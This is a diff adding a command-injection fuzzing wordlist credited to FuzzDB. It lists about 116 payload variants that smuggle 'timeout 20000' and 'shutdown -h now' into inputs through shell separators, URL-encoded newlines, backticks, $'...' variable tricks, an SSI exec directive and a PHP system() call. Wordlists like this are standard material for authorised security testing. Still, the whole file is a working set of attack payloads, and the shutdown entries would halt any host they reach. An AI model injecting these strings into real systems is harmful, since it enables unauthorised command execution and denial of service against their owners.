@@ -1,0 +1,117 @@
+# Based on FuzzDB (https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/os-cmd-execution/command-injection-template.txt)
+
+timeout 20000
+;timeout 20000
+;timeout 20000;
+^timeout 20000
+|timeout 20000
+<timeout 20000
+<timeout 20000;
+<timeout 20000\n
+<timeout 20000%0D
+<timeout 20000%0A
+&timeout 20000
+&timeout 20000&
+&&timeout 20000
+&&timeout 20000&&
+%0Dtimeout 20000
+%0Dtimeout 20000%0D
+%0Atimeout 20000
+%0Atimeout 20000%0A
+\ntimeout 20000
+\ntimeout 20000\n
+'timeout 20000'
+`timeout 20000`
+;timeout 20000|
+;timeout 20000/n
+|timeout 20000;
+a);timeout 20000
+a;timeout 20000
+a);timeout 20000
+a;timeout 20000;
+a);timeout 20000|
+FAIL||timeout 20000
+CMD=$'timeout 20000';$CMD
+;CMD=$'timeout 20000';$CMD
+^CMD=$'timeout 20000';$CMD
+|CMD=$'timeout 20000';$CMD
+&CMD=$'timeout 20000';$CMD
+&&CMD=$'timeout 20000';$CMD
+%0DCMD=$'timeout 20000';$CMD
+FAIL||CMD=$'timeout 20000';$CMD
+CMD=$\'timeout 20000\';$CMD
+;CMD=$\'timeout 20000\';$CMD
+^CMD=$\'timeout 20000\';$CMD
+|CMD=$\'timeout 20000\';$CMD
+&CMD=$\'timeout 20000\';$CMD
+&&CMD=$\'timeout 20000\';$CMD
+%0DCMD=$\'timeout 20000\';$CMD
+FAIL||CMD=$\'timeout 20000\';$CMD
+CMD=$"timeout 20000";$CMD
+;CMD=$"timeout 20000";$CMD
+^CMD=$"timeout 20000";$CMD
+|CMD=$"timeout 20000";$CMD
+&CMD=$"timeout 20000";$CMD
+&&CMD=$"timeout 20000";$CMD
+%0DCMD=$"timeout 20000";$CMD
+FAIL||CMD=$"timeout 20000";$CMD
+<!--#exec cmd="timeout 20000"-->
+;system('timeout 20000')
+
+shutdown -h now
+;shutdown -h now
+;shutdown -h now;
+^shutdown -h now
+|shutdown -h now
+<shutdown -h now
+<shutdown -h now;
+<shutdown -h now\n
+<shutdown -h now%0D
+<shutdown -h now%0A
+&shutdown -h now
+&shutdown -h now&
+&&shutdown -h now
+&&shutdown -h now&&
+%0Dshutdown -h now
+%0Dshutdown -h now%0D
+%0Ashutdown -h now
+%0Ashutdown -h now%0A
+\nshutdown -h now
+\nshutdown -h now\n
+'shutdown -h now'
+`shutdown -h now`
+;shutdown -h now|
+;shutdown -h now/n
+|shutdown -h now;
+a);shutdown -h now
+a;shutdown -h now
+a);shutdown -h now
+a;shutdown -h now;
+a);shutdown -h now|
+FAIL||shutdown -h now
+CMD=$'shutdown -h now';$CMD
+;CMD=$'shutdown -h now';$CMD
+^CMD=$'shutdown -h now';$CMD
+|CMD=$'shutdown -h now';$CMD
+&CMD=$'shutdown -h now';$CMD
+&&CMD=$'shutdown -h now';$CMD
+%0DCMD=$'shutdown -h now';$CMD
+FAIL||CMD=$'shutdown -h now';$CMD
+CMD=$\'shutdown -h now\';$CMD
+;CMD=$\'shutdown -h now\';$CMD
+^CMD=$\'shutdown -h now\';$CMD
+|CMD=$\'shutdown -h now\';$CMD
+&CMD=$\'shutdown -h now\';$CMD
+&&CMD=$\'shutdown -h now\';$CMD
+%0DCMD=$\'shutdown -h now\';$CMD
+FAIL||CMD=$\'shutdown -h now\';$CMD
+CMD=$"shutdown -h now";$CMD
+;CMD=$"shutdown -h now";$CMD
+^CMD=$"shutdown -h now";$CMD
+|CMD=$"shutdown -h now";$CMD
+&CMD=$"shutdown -h now";$CMD
+&&CMD=$"shutdown -h now";$CMD
+%0DCMD=$"shutdown -h now";$CMD
+FAIL||CMD=$"shutdown -h now";$CMD
+<!--#exec cmd="shutdown -h now"-->
+;system('shutdown -h now')
